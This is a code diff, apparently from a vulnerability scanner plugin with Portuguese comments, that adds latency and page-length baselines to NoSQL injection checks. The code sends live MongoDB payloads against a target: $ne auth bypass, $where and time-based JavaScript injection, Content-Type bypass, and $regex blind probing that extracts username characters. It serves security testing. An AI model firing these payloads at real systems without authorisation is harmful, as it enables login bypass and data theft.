@@ -92,8 +92,32 @@ SSJI_TIME_PAYLOADS = [
 CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
 
 
-def _test_auth_bypass(target, endpoint):
-    """Testa auth bypass via operadores MongoDB."""
+def _get_baseline_latency(target):
+    """Calcula o tempo natural de resposta do servidor da API/Alvo."""
+    latencies = []
+    for _ in range(3):
+        try:
+            start = time.time()
+            requests.get(f"http://{target}/", timeout=8)
+            latencies.append(time.time() - start)
+        except Exception:
+            continue
+    if latencies:
+        return sum(latencies) / len(latencies)
+    return 0.5  # default conservador
+
+
+def _get_404_baseline(target):
+    """Captura a resposta de uma página inexistente para calcular a baseline de tamanho (Soft-404 / WAF)."""
+    try:
+        resp = requests.get(f"http://{target}/cascavel_nao_existe_12345", timeout=5)
+        return len(resp.text)
+    except Exception:
+        return 0
+
+
+def _test_auth_bypass(target, endpoint, baseline_len):
+    """Testa auth bypass via operadores MongoDB com verificação de baseline de tamanho."""
     vulns = []
     url = f"http://{target}{endpoint}"
     for payload, method in AUTH_PAYLOADS:
@@ -104,7 +128,17 @@ def _test_auth_bypass(target, endpoint):
                 timeout=6,
                 headers={"Content-Type": "application/json"},
             )
-            if resp.status_code == 200 and any(k in resp.text.lower() for k in SUCCESS_INDICATORS):
+
+            resp_len = len(resp.text)
+            # Tolerância de 5% ou 50 bytes
+            tolerance = max(baseline_len * 0.05, 50)
+            diff_from_baseline = abs(resp_len - baseline_len)
+
+            if (
+                resp.status_code == 200
+                and any(k in resp.text.lower() for k in SUCCESS_INDICATORS)
+                and diff_from_baseline > tolerance
+            ):
                 vulns.append(
                     {
                         "tipo": "NOSQL_AUTH_BYPASS",
@@ -113,6 +147,7 @@ def _test_auth_bypass(target, endpoint):
                         "severidade": "CRITICO",
                         "descricao": f"Auth bypass via {method}!",
                         "amostra": resp.text[:200],
+                        "diff_bytes": diff_from_baseline,
                     }
                 )
                 break
@@ -121,19 +156,24 @@ def _test_auth_bypass(target, endpoint):
     return vulns
 
 
-def _test_get_injection(target, endpoint):
-    """Testa NoSQL injection via GET parameters."""
+def _test_get_injection(target, endpoint, baseline_len):
+    """Testa NoSQL injection via GET parameters com verificação de baseline de tamanho."""
     vulns = []
     for suffix, method in GET_PAYLOADS:
         try:
             resp = requests.get(f"http://{target}{endpoint}?username{suffix}&password{suffix}", timeout=5)
-            if resp.status_code == 200 and len(resp.text) > 100:
+            resp_len = len(resp.text)
+            tolerance = max(baseline_len * 0.05, 50)
+            diff_from_baseline = abs(resp_len - baseline_len)
+
+            if resp.status_code == 200 and resp_len > 100 and diff_from_baseline > tolerance:
                 vulns.append(
                     {
                         "tipo": "NOSQL_GET_INJECTION",
                         "metodo": method,
                         "endpoint": endpoint,
                         "severidade": "ALTO",
+                        "diff_bytes": diff_from_baseline,
                     }
                 )
                 break
@@ -142,8 +182,8 @@ def _test_get_injection(target, endpoint):
     return vulns
 
 
-def _test_where_injection(target, endpoint):
-    """Testa $where JavaScript injection (boolean + time-based)."""
+def _test_where_injection(target, endpoint, baseline_latency, baseline_len):
+    """Testa $where JavaScript injection (boolean + time-based) validadas contra a baseline."""
     vulns = []
     url = f"http://{target}{endpoint}"
 
@@ -156,19 +196,28 @@ def _test_where_injection(target, endpoint):
                 timeout=8,
                 headers={"Content-Type": "application/json"},
             )
-            if resp.status_code == 200 and len(resp.text) > 50:
+            resp_len = len(resp.text)
+            tolerance = max(baseline_len * 0.05, 50)
+            diff_from_baseline = abs(resp_len - baseline_len)
+
+            if resp.status_code == 200 and resp_len > 50 and diff_from_baseline > tolerance:
                 vulns.append(
                     {
                         "tipo": "NOSQL_WHERE_INJECTION",
                         "metodo": method,
                         "endpoint": endpoint,
                         "severidade": "ALTO",
+                        "diff_bytes": diff_from_baseline,
                     }
                 )
         except Exception:
             continue
 
     # Time-based SSJI
+    # Ignora SSJI baseado em tempo se o servidor já está extremamente engasgado nativamente
+    if baseline_latency > 8.0:
+        return vulns
+
     for payload, method, threshold in SSJI_TIME_PAYLOADS:
         try:
             start = time.time()
@@ -179,7 +228,7 @@ def _test_where_injection(target, endpoint):
                 headers={"Content-Type": "application/json"},
             )
             elapsed = time.time() - start
-            if elapsed > threshold:
+            if elapsed > (threshold + baseline_latency):
                 vulns.append(
                     {
                         "tipo": "NOSQL_SSJI",
@@ -187,19 +236,21 @@ def _test_where_injection(target, endpoint):
                         "endpoint": endpoint,
                         "severidade": "CRITICO",
                         "tempo": round(elapsed, 2),
+                        "baseline_estimada": round(baseline_latency, 2),
                         "descricao": "Server-Side JavaScript Injection via $where (time-based)!",
                     }
                 )
                 break
         except requests.Timeout:
-            vulns.append(
-                {
-                    "tipo": "NOSQL_SSJI_TIMEOUT",
-                    "metodo": method,
-                    "endpoint": endpoint,
-                    "severidade": "ALTO",
-                }
-            )
+            if baseline_latency < 3.0:
+                vulns.append(
+                    {
+                        "tipo": "NOSQL_SSJI_TIMEOUT",
+                        "metodo": method,
+                        "endpoint": endpoint,
+                        "severidade": "ALTO",
+                    }
+                )
             break
         except Exception:
             continue
@@ -211,6 +262,14 @@ def _test_blind_boolean(target, endpoint):
     """Testa blind boolean NoSQL injection via $regex."""
     url = f"http://{target}{endpoint}"
     try:
+        # Baseline request (likely false)
+        r_base = requests.post(
+            url,
+            json={"username": "nao_existo_cascavel_123", "password": "nao_existo_cascavel_123"},
+            timeout=5,
+            headers={"Content-Type": "application/json"},
+        )
+
         r_true = requests.post(
             url,
             json={"username": {"$regex": "^a"}, "password": {"$ne": ""}},
@@ -223,7 +282,23 @@ def _test_blind_boolean(target, endpoint):
             timeout=5,
             headers={"Content-Type": "application/json"},
         )
-        if len(r_true.text) != len(r_false.text) or r_true.status_code != r_false.status_code:
+
+        # dynamic tolerance
+        b_len = len(r_base.text)
+        t_len = len(r_true.text)
+        f_len = len(r_false.text)
+        tolerance = max(b_len * 0.02, 50)
+
+        # Se true differe muito do false, e false é parecido com baseline ou vice-versa
+        diff_tf = abs(t_len - f_len)
+        diff_tb = abs(t_len - b_len)
+        diff_fb = abs(f_len - b_len)
+
+        if (
+            diff_tf > tolerance
+            and (diff_tb <= tolerance or diff_fb <= tolerance)
+            or r_true.status_code != r_false.status_code
+        ):
             # Try to extract first 3 chars of username
             extracted = ""
             for _pos in range(3):
@@ -245,7 +320,7 @@ def _test_blind_boolean(target, endpoint):
     return None
 
 
-def _test_content_type_bypass(target, endpoint):
+def _test_content_type_bypass(target, endpoint, baseline_len):
     """Testa NoSQL injection quando Content-Type não é validado."""
     payloads_str = [
         '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
@@ -263,13 +338,22 @@ def _test_content_type_bypass(target, endpoint):
                 timeout=5,
                 headers={"Content-Type": ct},
             )
-            if resp.status_code == 200 and any(k in resp.text.lower() for k in SUCCESS_INDICATORS):
+            resp_len = len(resp.text)
+            tolerance = max(baseline_len * 0.05, 50)
+            diff_from_baseline = abs(resp_len - baseline_len)
+
+            if (
+                resp.status_code == 200
+                and any(k in resp.text.lower() for k in SUCCESS_INDICATORS)
+                and diff_from_baseline > tolerance
+            ):
                 return {
                     "tipo": "NOSQL_CONTENT_TYPE_BYPASS",
                     "endpoint": endpoint,
                     "severidade": "CRITICO",
                     "content_type": ct,
                     "descricao": f"NoSQL injection via Content-Type bypass ({ct})!",
+                    "diff_bytes": diff_from_baseline,
                 }
         except Exception:
             continue
@@ -289,15 +373,19 @@ def run(target, ip, open_ports, banners):
     _ = (ip, open_ports, banners, _json)
     vulns = []
 
+    # Calcular Baseline da infraestrutura NoSQL alvo
+    baseline_latency = _get_baseline_latency(target)
+    baseline_len = _get_404_baseline(target)
+
     for ep in ENDPOINTS:
         # 1. Auth bypass
-        vulns.extend(_test_auth_bypass(target, ep))
+        vulns.extend(_test_auth_bypass(target, ep, baseline_len))
 
         # 2. GET parameter injection
-        vulns.extend(_test_get_injection(target, ep))
+        vulns.extend(_test_get_injection(target, ep, baseline_len))
 
-        # 3. $where injection (boolean + time-based SSJI)
-        vulns.extend(_test_where_injection(target, ep))
+        # 3. $where injection (boolean + time-based SSJI validada contra Baseline)
+        vulns.extend(_test_where_injection(target, ep, baseline_latency, baseline_len))
 
         # 4. Blind boolean extraction
         blind = _test_blind_boolean(target, ep)
@@ -305,7 +393,7 @@ def run(target, ip, open_ports, banners):
             vulns.append(blind)
 
         # 5. Content-Type bypass
-        ct_vuln = _test_content_type_bypass(target, ep)
+        ct_vuln = _test_content_type_bypass(target, ep, baseline_len)
         if ct_vuln:
             vulns.append(ct_vuln)
 
